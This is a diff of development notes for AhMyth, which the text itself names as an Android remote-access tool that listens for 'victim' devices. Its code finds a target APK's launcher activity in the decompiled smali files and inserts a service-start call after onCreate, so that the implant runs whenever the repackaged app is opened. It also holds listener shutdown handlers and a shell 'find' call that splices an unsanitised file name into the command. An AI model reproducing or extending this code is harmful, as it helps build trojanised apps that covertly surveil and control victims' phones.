@@ -1,4 +1,4 @@
-Launcher Extraction for `<application"` attribute | AppCtrl.js |
+Launcher Extraction for `<application"` attribute | AppCtrl.js = Line 5658 --> 5707 |
 ```javascript
 function GetLauncherPath(manifest, smaliPath) {
 
@@ -33,11 +33,12 @@ function GetLauncherPath(manifest, smaliPath) {
 
             if (manifest.indexOf('android:targetActivity="') != -1) {
                 manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
-                manifest = manifest.substring(0, manifest.indexOf('"'))
-                manifest = manifest.replace(/\./g, "/");
-                manifest = path.join(smaliPath, manifest) + ".smali"
-                return manifest;
-
+                manifest = manifest.substring(1, manifest.indexOf('"'))
+                manifest = path.join(smaliPath, manifest) + '.smali';
+                var files = fs.walkSync(smaliPath);
+                for (var i = 0; i < files.length; i++) {
+                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
+                        return files[i];
                 }
 
             } else {
@@ -58,12 +59,25 @@ function GetLauncherPath(manifest, smaliPath) {
 ```
   
 
-OrgAppKey2 | Constants.js |
+OrgAppKey2 | Constants.js = Line 32 |
 ```javascript
 exports.orgAppKey2 = ';->onCreate()V';
 ```
+
+
+OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
+```javascript
+var key = CONSTANTS.orgAppKey2;
+$appCtrl.Log("Modifiying launcher activity...");
+var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
+fs.writeFile(launcherPath, output, 'utf8', (error) => {
+    if (error) {
+        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
+        return;
+    }
+```
     
-Stop function for the AhMyth Listener | AppCtrl.js |
+Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
 ```javascript
     // when user clicks Disconnect Button
     $appCtrl.Stop = (port) => {
@@ -94,7 +108,7 @@ Stop function for the AhMyth Listener | AppCtrl.js |
     }
 ```
   
-Stop function for the AhMyth Listener | Main.js |
+Stop function for the AhMyth Listener | Main.js = Line 131 --> 166 + Line 244 --> Line 253 |
 ```javascript 
 // fired when stopped listening for victim
 ipcMain.on("SocketIO:StopListen", function (event, port) {
@@ -145,28 +159,36 @@ process.on('uncaughtException', function (error) {
 });
 ```
 
-Stop function for the AhMyth Listener | index.html |
+Stop function for the AhMyth Listener | index.html = Line 69 |
 ```html
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
 
-Function to properly locate launcher activity | AppCtrl.js |
+code utilising `unix "find"` command to find the correct launcher activity
+this is currently half working with apks whose launcher activity is in a smali_classes directory
+only problem is an error is still thrown when it shouldn't be indicating that i am doing something wrong some where
 ```javascript
-                // this returns full path of smali file starting from the users home directory
                 $appCtrl.Log("Locating Launcher Activity...")
-                exec('find -name "' + launcherPath + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
-                  var launcherActivity = path.join(apkFolder, stdout.substring(stdout.indexOf("./") + 2));
+                $appCtrl.Log();
+                exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
+                  var launcherPath = path.join(apkFolder, stdout.substring(stdout.indexOf("./") + 2).trim("\n"));
                   if (error !== null) {
-                      $appCtrl.Log("Locating Launcher Activity Failed!", CONSTANTS.logStatus.FAIL);
+                      $appCtrl.Log("Cannot Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                      $appCtrl.Log('Please use the "On Boot" method', CONSTANTS.logStatus.INFO);
+                      $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
+                      $appCtrl.Log();
                       return;
                     }
                     
-                    // but it fails to read the file afterwards
-                    $appCtrl.Log("Smali File to hook: " + launcherActivity); // print filepath in the log to confirm the file was found
+                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                     $appCtrl.Log();
-                    fs.readFile(launcherActivity, 'utf8', (error, data) => {
+                    $appCtrl.Log("Fetching Launcher Activity...")
+                    $appCtrl.Log();
+                    fs.readFile(launcherPath, 'utf8', (error, data) => {
                         if (error) {
                             $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                            $appCtrl.Log('Please use the "On Boot" method', CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                             $appCtrl.Log();
                             return;
                         }
